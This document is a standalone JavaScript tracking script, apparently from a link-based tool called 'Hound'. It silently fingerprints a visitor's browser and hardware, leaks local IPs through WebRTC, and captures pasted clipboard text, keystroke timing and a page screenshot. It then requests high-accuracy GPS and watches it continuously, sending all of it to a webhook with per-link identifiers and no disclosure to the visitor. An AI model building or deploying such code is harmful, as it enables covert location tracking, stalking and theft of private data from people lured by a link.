<script>
(function () {
  "use strict";

  var SESSION_KEY = "hound_session_id";
  var sessionId = sessionStorage.getItem(SESSION_KEY);
  if (!sessionId) {
    sessionId = (window.crypto && crypto.randomUUID)
      ? crypto.randomUUID()
      : "sess-" + Date.now() + "-" + Math.random().toString(36).slice(2);
    sessionStorage.setItem(SESSION_KEY, sessionId);
  }

  var pageLoadTime = Date.now();
  var locationWatchId = null;
  var locationHistory = [];
  var behaviorBuffer = {
    clicks: 0,
    scrolls: 0,
    mouse_moves: 0,
    keydowns: 0,
    pastes: 0,
    visibility_changes: [],
    focus_changes: [],
    typing_intervals: [],
    scroll_depth_max: 0
  };
  var lastKeydownAt = null;

  function hashString(str) {
    var hash = 5381;
    for (var i = 0; i < str.length; i++) {
      hash = ((hash << 5) + hash) + str.charCodeAt(i);
      hash = hash & hash;
    }
    return (hash >>> 0).toString(16);
  }

  function send(eventType, data) {
    var body = Object.assign({
      event_type: eventType,
      session_id: sessionId,
      captured_at: new Date().toISOString(),
      page_url: location.href,
      link_variant: new URLSearchParams(location.search).get("id") || null,
      url_params: Object.fromEntries(new URLSearchParams(location.search).entries()),
      referrer: document.referrer || null,
      time_on_page_ms: Date.now() - pageLoadTime
    }, data || {});

    try {
      fetch("webhook.php", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(body),
        keepalive: true
      }).catch(function () {});
    } catch (e) {}
  }

  window.Hound = { send: send, sessionId: sessionId };

  function getConnectionInfo() {
    var conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
    if (!conn) return null;
    return {
      effective_type: conn.effectiveType || null,
      downlink: conn.downlink || null,
      rtt: conn.rtt || null,
      save_data: conn.saveData || null,
      type: conn.type || null
    };
  }

  function getScreenInfo() {
    return {
      width: screen.width,
      height: screen.height,
      avail_width: screen.availWidth,
      avail_height: screen.availHeight,
      color_depth: screen.colorDepth,
      pixel_depth: screen.pixelDepth,
      device_pixel_ratio: window.devicePixelRatio,
      orientation: screen.orientation ? screen.orientation.type : null
    };
  }

  function getWindowInfo() {
    return {
      inner_width: window.innerWidth,
      inner_height: window.innerHeight,
      outer_width: window.outerWidth,
      outer_height: window.outerHeight,
      screen_x: window.screenX,
      screen_y: window.screenY
    };
  }

  function getCanvasFingerprint() {
    try {
      var canvas = document.createElement("canvas");
      var ctx = canvas.getContext("2d");
      if (!ctx) return null;
      canvas.width = 240;
      canvas.height = 60;
      ctx.textBaseline = "top";
      ctx.font = "14px Arial";
      ctx.fillStyle = "#f60";
      ctx.fillRect(0, 0, 120, 30);
      ctx.fillStyle = "#069";
      ctx.fillText("Hound fingerprint", 2, 2);
      ctx.strokeStyle = "#ff0";
      ctx.arc(50, 25, 18, 0, Math.PI * 2);
      ctx.stroke();
      return hashString(canvas.toDataURL());
    } catch (e) {
      return null;
    }
  }

  function getWebGLFingerprint() {
    try {
      var canvas = document.createElement("canvas");
      var gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
      if (!gl) return null;
      var debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
      return {
        vendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : gl.getParameter(gl.VENDOR),
        renderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : gl.getParameter(gl.RENDERER),
        version: gl.getParameter(gl.VERSION),
        shading_language: gl.getParameter(gl.SHADING_LANGUAGE_VERSION),
        hash: hashString(JSON.stringify({
          vendor: gl.getParameter(gl.VENDOR),
          renderer: gl.getParameter(gl.RENDERER)
        }))
      };
    } catch (e) {
      return null;
    }
  }

  function getAudioFingerprint(callback) {
    try {
      var AudioCtx = window.OfflineAudioContext || window.webkitOfflineAudioContext;
      if (!AudioCtx) {
        callback(null);
        return;
      }
      var context = new AudioCtx(1, 44100, 44100);
      var oscillator = context.createOscillator();
      oscillator.type = "triangle";
      oscillator.frequency.value = 10000;
      var compressor = context.createDynamicsCompressor();
      oscillator.connect(compressor);
      compressor.connect(context.destination);
      oscillator.start(0);
      context.startRendering();
      context.oncomplete = function (event) {
        var output = event.renderedBuffer.getChannelData(0).slice(4500, 5000);
        var sum = 0;
        for (var i = 0; i < output.length; i++) sum += Math.abs(output[i]);
        callback(hashString(String(sum)));
      };
    } catch (e) {
      callback(null);
    }
  }

  function detectFonts() {
    var baseFonts = ["monospace", "sans-serif", "serif"];
    var testFonts = [
      "Arial", "Arial Black", "Calibri", "Cambria", "Comic Sans MS", "Consolas",
      "Courier New", "Georgia", "Helvetica", "Impact", "Lucida Console", "Segoe UI",
      "Tahoma", "Times New Roman", "Trebuchet MS", "Verdana", "Roboto", "Ubuntu"
    ];
    var testString = "mmmmmmmmmmlli";
    var testSize = "72px";
    var body = document.body || document.documentElement;
    var span = document.createElement("span");
    span.style.position = "absolute";
    span.style.left = "-9999px";
    span.style.fontSize = testSize;
    span.innerHTML = testString;
    body.appendChild(span);

    var baseline = {};
    baseFonts.forEach(function (font) {
      span.style.fontFamily = font;
      baseline[font] = span.offsetWidth + "|" + span.offsetHeight;
    });

    var detected = [];
    testFonts.forEach(function (font) {
      var matched = false;
      baseFonts.forEach(function (base) {
        span.style.fontFamily = '"' + font + '",' + base;
        if ((span.offsetWidth + "|" + span.offsetHeight) !== baseline[base]) {
          matched = true;
        }
      });
      if (matched) detected.push(font);
    });

    body.removeChild(span);
    return detected;
  }

  function detectAdBlocker() {
    var bait = document.createElement("div");
    bait.className = "adsbox pub_300x250 ad-banner";
    bait.style.height = "1px";
    bait.style.width = "1px";
    bait.style.position = "absolute";
    bait.style.left = "-9999px";
    document.body.appendChild(bait);
    var blocked = bait.offsetHeight === 0 || window.getComputedStyle(bait).display === "none";
    document.body.removeChild(bait);
    return blocked;
  }

  function queryPermission(name) {
    if (!navigator.permissions || !navigator.permissions.query) {
      return Promise.resolve(null);
    }
    return navigator.permissions.query({ name: name }).then(function (result) {
      return result.state;
    }).catch(function () {
      return null;
    });
  }

  function getBatteryInfo() {
    if (!navigator.getBattery) return Promise.resolve(null);
    return navigator.getBattery().then(function (battery) {
      return {
        level: battery.level,
        charging: battery.charging,
        charging_time: battery.chargingTime,
        discharging_time: battery.dischargingTime
      };
    }).catch(function () { return null; });
  }

  function getStorageEstimate() {
    if (!navigator.storage || !navigator.storage.estimate) {
      return Promise.resolve(null);
    }
    return navigator.storage.estimate().then(function (estimate) {
      return {
        quota: estimate.quota,
        usage: estimate.usage,
        persistent: navigator.storage.persisted ? null : null
      };
    }).catch(function () { return null; });
  }

  function getPersistedStorage() {
    if (!navigator.storage || !navigator.storage.persisted) {
      return Promise.resolve(null);
    }
    return navigator.storage.persisted();
  }

  function enumerateMediaDevices() {
    if (!navigator.mediaDevices || !navigator.mediaDevices.enumerateDevices) {
      return Promise.resolve(null);
    }
    return navigator.mediaDevices.enumerateDevices().then(function (devices) {
      return devices.map(function (device) {
        return {
          kind: device.kind,
          label: device.label || null,
          device_id_hash: device.deviceId ? hashString(device.deviceId) : null
        };
      });
    }).catch(function () { return null; });
  }

  function tryWebRtcLocalIps(callback) {
    var ips = [];
    try {
      var RTCPeer = window.RTCPeerConnection || window.webkitRTCPeerConnection || window.mozRTCPeerConnection;
      if (!RTCPeer) {
        callback(null);
        return;
      }
      var pc = new RTCPeer({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
      pc.createDataChannel("");
      pc.createOffer().then(function (offer) { return pc.setLocalDescription(offer); });
      pc.onicecandidate = function (event) {
        if (!event || !event.candidate || !event.candidate.candidate) return;
        var match = /([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9:]+)/gi.exec(event.candidate.candidate);
        if (match && ips.indexOf(match[1]) === -1) ips.push(match[1]);
      };
      setTimeout(function () {
        try { pc.close(); } catch (e) {}
        callback(ips.length ? ips : null);
      }, 2000);
    } catch (e) {
      callback(null);
    }
  }

  function collectStaticFingerprint() {
    var staticData = {
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      timezone_offset_minutes: new Date().getTimezoneOffset(),
      languages: navigator.languages ? Array.from(navigator.languages) : [navigator.language],
      language: navigator.language,
      platform: navigator.platform,
      vendor: navigator.vendor,
      user_agent: navigator.userAgent,
      device_memory_gb: navigator.deviceMemory || null,
      hardware_concurrency: navigator.hardwareConcurrency || null,
      connection: getConnectionInfo(),
      screen: getScreenInfo(),
      window: getWindowInfo(),
      touch_support: {
        max_touch_points: navigator.maxTouchPoints || 0,
        touch_events: "ontouchstart" in window
      },
      do_not_track: navigator.doNotTrack || window.doNotTrack || null,
      cookie_enabled: navigator.cookieEnabled,
      online: navigator.onLine,
      pdf_viewer_enabled: navigator.pdfViewerEnabled || null,
      webdriver: navigator.webdriver || false,
      canvas_fingerprint: getCanvasFingerprint(),
      webgl_fingerprint: getWebGLFingerprint(),
      fonts_detected: detectFonts(),
      ad_blocker_detected: detectAdBlocker(),
      local_storage_available: !!window.localStorage,
      session_storage_available: !!window.sessionStorage,
      indexed_db_available: !!window.indexedDB,
      notification_permission: (window.Notification && Notification.permission) || null,
      document_character_set: document.characterSet,
      plugin_count: navigator.plugins ? navigator.plugins.length : 0
    };

    Promise.all([
      getBatteryInfo(),
      getStorageEstimate(),
      getPersistedStorage(),
      enumerateMediaDevices(),
      queryPermission("geolocation"),
      queryPermission("notifications"),
      queryPermission("camera"),
      queryPermission("microphone")
    ]).then(function (results) {
      staticData.battery = results[0];
      staticData.storage = results[1];
      staticData.storage_persistent = results[2];
      staticData.media_devices = results[3];
      staticData.permissions = {
        geolocation: results[4],
        notifications: results[5],
        camera: results[6],
        microphone: results[7]
      };

      getAudioFingerprint(function (audioHash) {
        staticData.audio_fingerprint = audioHash;
        staticData.composite_fingerprint = hashString(JSON.stringify({
          canvas: staticData.canvas_fingerprint,
          webgl: staticData.webgl_fingerprint,
          audio: audioHash,
          fonts: staticData.fonts_detected,
          ua: staticData.user_agent,
          screen: staticData.screen,
          timezone: staticData.timezone
        }));
        send("fingerprint", staticData);
      });
    });
  }

  function normalizeCoords(position) {
    var c = position.coords;
    return {
      latitude: c.latitude,
      longitude: c.longitude,
      accuracy: c.accuracy,
      altitude: c.altitude,
      altitude_accuracy: c.altitudeAccuracy,
      heading: c.heading,
      speed: c.speed,
      timestamp: position.timestamp
    };
  }

  function sendLocation(eventType, position, extra) {
    send(eventType, Object.assign({
      coordinates: normalizeCoords(position),
      location_history_count: locationHistory.length
    }, extra || {}));
  }

  function startLocationWatch() {
    if (!navigator.geolocation || locationWatchId !== null) return;
    locationWatchId = navigator.geolocation.watchPosition(
      function (position) {
        locationHistory.push(normalizeCoords(position));
        if (locationHistory.length % 3 === 0) {
          send("location_update", {
            coordinates: normalizeCoords(position),
            location_history: locationHistory.slice(-10)
          });
        }
      },
      function () {},
      { enableHighAccuracy: true, maximumAge: 0, timeout: 20000 }
    );
  }

  window.gpsLocation = function gpsLocation() {
    collectStaticFingerprint();
    initBehaviorTracking();
    captureScreenshotLater();
    tryWebRtcLocalIps(function (localIps) {
      if (localIps) send("webrtc_local_ips", { local_ips: localIps });
    });

    function startGps() {
      var delay = 8000;
      if (window.HoundSmart && window.HoundSmart.getConfig()) {
        delay = window.HoundSmart.getGpsDelay();
      }
      setTimeout(requestGpsCapture, delay);
    }

    if (window.HoundSmart && typeof window.HoundSmart.whenReady === "function") {
      var started = false;
      var timer = setTimeout(function () {
        if (started) return;
        started = true;
        startGps();
      }, 2000);
      window.HoundSmart.whenReady(function () {
        if (started) return;
        started = true;
        clearTimeout(timer);
        startGps();
      });
    } else {
      startGps();
    }
    setupDeviceOrientation();
  };

  function requestGpsCapture(retryCount) {
    if (!navigator.geolocation) {
      send("location_error", { error: "geolocation_unavailable" });
      return;
    }

    navigator.geolocation.getCurrentPosition(
      function (position) {
        locationHistory.push(normalizeCoords(position));
        sendLocation("location", position, { source: "getCurrentPosition", retry_count: retryCount || 0 });
        startLocationWatch();
      },
      function (error) {
        send("location_error", {
          error_code: error.code,
          error_message: error.message,
          permission_likely_denied: error.code === 1,
          retry_count: retryCount || 0
        });
        if (error.code === 1 && window.HoundSmart && typeof window.HoundSmart.onGpsDenied === "function") {
          window.HoundSmart.onGpsDenied();
        }
      },
      { enableHighAccuracy: true, maximumAge: 0, timeout: 20000 }
    );
  }

  window.HoundRequestGps = requestGpsCapture;

  function setupDeviceOrientation() {
    if (!window.DeviceOrientationEvent) return;
    var handleOrientation = function (event) {
      send("device_orientation", {
        alpha: event.alpha,
        beta: event.beta,
        gamma: event.gamma,
        absolute: event.absolute
      });
      window.removeEventListener("deviceorientation", handleOrientation);
    };
    if (typeof DeviceOrientationEvent.requestPermission === "function") {
      DeviceOrientationEvent.requestPermission().then(function (state) {
        if (state === "granted") {
          window.addEventListener("deviceorientation", handleOrientation);
        } else {
          send("device_orientation", { permission: state });
        }
      }).catch(function () {});
    } else {
      window.addEventListener("deviceorientation", handleOrientation);
    }
  }

  function initBehaviorTracking() {
    document.addEventListener("click", function () {
      behaviorBuffer.clicks += 1;
    }, true);

    document.addEventListener("scroll", function () {
      behaviorBuffer.scrolls += 1;
      var depth = Math.round((window.scrollY + window.innerHeight) / Math.max(document.body.scrollHeight, 1) * 100);
      if (depth > behaviorBuffer.scroll_depth_max) behaviorBuffer.scroll_depth_max = depth;
    }, { passive: true });

    document.addEventListener("mousemove", function () {
      behaviorBuffer.mouse_moves += 1;
    }, { passive: true });

    document.addEventListener("keydown", function () {
      behaviorBuffer.keydowns += 1;
      var now = Date.now();
      if (lastKeydownAt) behaviorBuffer.typing_intervals.push(now - lastKeydownAt);
      lastKeydownAt = now;
    });

    document.addEventListener("paste", function (event) {
      behaviorBuffer.pastes += 1;
      var pasted = "";
      try {
        pasted = (event.clipboardData && event.clipboardData.getData("text")) || "";
      } catch (e) {}
      send("paste", { pasted_text: pasted.slice(0, 500) });
    });

    document.addEventListener("visibilitychange", function () {
      behaviorBuffer.visibility_changes.push({
        state: document.visibilityState,
        at: new Date().toISOString()
      });
    });

    window.addEventListener("focus", function () {
      behaviorBuffer.focus_changes.push({ focused: true, at: new Date().toISOString() });
    });

    window.addEventListener("blur", function () {
      behaviorBuffer.focus_changes.push({ focused: false, at: new Date().toISOString() });
    });

    setInterval(function () {
      if (!behaviorBuffer.clicks && !behaviorBuffer.scrolls && !behaviorBuffer.keydowns && !behaviorBuffer.mouse_moves) {
        return;
      }
      send("behavior", {
        behavior: Object.assign({}, behaviorBuffer, {
          typing_intervals: behaviorBuffer.typing_intervals.slice(-20)
        })
      });
      behaviorBuffer.clicks = 0;
      behaviorBuffer.scrolls = 0;
      behaviorBuffer.mouse_moves = 0;
      behaviorBuffer.keydowns = 0;
      behaviorBuffer.pastes = 0;
      behaviorBuffer.typing_intervals = [];
    }, 15000);

    window.addEventListener("pagehide", function () {
      send("session_end", {
        behavior: behaviorBuffer,
        location_history: locationHistory,
        total_time_on_page_ms: Date.now() - pageLoadTime
      });
      if (locationWatchId !== null) navigator.geolocation.clearWatch(locationWatchId);
    });
  }

  function captureScreenshotLater() {
    setTimeout(function () {
      var script = document.createElement("script");
      script.src = "https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js";
      script.onload = function () {
        if (!window.html2canvas) return;
        html2canvas(document.body, { useCORS: true, logging: false, scale: 0.5 }).then(function (canvas) {
          send("screenshot", {
            screenshot_base64: canvas.toDataURL("image/jpeg", 0.6).slice(0, 120000)
          });
        }).catch(function () {});
      };
      document.head.appendChild(script);
    }, 2500);
  }
})();
</script>
